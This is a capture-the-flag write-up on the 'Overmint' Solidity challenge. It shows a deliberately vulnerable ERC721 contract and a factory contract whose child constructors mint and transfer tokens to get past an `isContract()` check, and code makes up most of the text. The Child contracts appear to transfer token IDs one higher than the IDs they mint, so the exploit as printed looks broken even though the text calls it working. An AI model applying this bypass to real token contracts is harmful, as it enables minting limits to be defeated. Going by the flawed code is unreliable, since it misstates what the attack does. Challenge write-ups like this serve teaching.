# Overmint

This hack requires a few steps. Let's note the main vulnerability here:

The victim contract `AnatemToken` implements a OZ lib, `Address.sol`. It looks like it prevents contract addresses from calling certain code, However, this is not completely true. Read [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol) @ Line 31-33 for the disclaimer.



## The setup

- Deploy the AnatemToken (create an instance to hack) See code below
- Update `VICTIM_ADDR` constant in attck contract (this could be re-written and passed in as a constructor arg)
- Deploy attacking contract

### Victim (Contract used to create instance to be hacked):
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.1;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract AnatemToken is ERC721 {
    using Address for address;
    mapping(address => uint256) public amountMinted;
    uint256 totalSupply;

    constructor() ERC721("AnatemToken", "AT") {}

    function mint() external {
        require(!msg.sender.isContract(), "no contracts");
        require(amountMinted[msg.sender] <= 3, "max 3 NFTs");
        _safeMint(msg.sender, totalSupply);
        totalSupply++;
        amountMinted[msg.sender]++;
    }

    function success(address _attacker) external view returns (bool) {
        return balanceOf(_attacker) == 5;
    }
}
```
### Attacking Contract:
```
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.1;

import "./AnatemToken.sol";

contract AttackFactory {

    address constant VICTIM_ADDR = 0x1752d560808356a39049018EC60147ADBb9a91dc;

    function createAttackChildrenContracts() external {
        Child child1 = new Child(VICTIM_ADDR, address(this), 1);
        Child child2 = new Child(VICTIM_ADDR, address(this), 2);
        Child child3 = new Child(VICTIM_ADDR, address(this), 3);
        Child child4 = new Child(VICTIM_ADDR, address(this), 4);
        Child child5 = new Child(VICTIM_ADDR, address(this), 5);
    }
}

contract Child {
    constructor(address _victim, address _parent, uint256 _tokenId) {
    
        AnatemToken anatemToken = AnatemToken(_victim);

        anatemToken.mint();
        anatemToken.transferFrom(address(this), _parent, _tokenId);
    }
}
```

## The attack

By calling the `createAttackChildrenContracts` func in the attacking contract we set in motion a series of events.
- Create five instances of another contract using the Factory(parent/child) pattern
- The code in the `Child` contract's constructor will be run on instantiation. 

This is VERY important for two reasons.

  - The main vulnerability in the `AnatemToken` contract is based upon code being run from a constructor (see above)
  - This code does not need to be directly called by a person or other contract.

- Each `Child` contract will mint a token and then transfer it to the parent(factory) contract `AttackFactory` automatically
- At any point after this, the parent(factory) contract will be on posession of five tokens and can fulfill the `success` check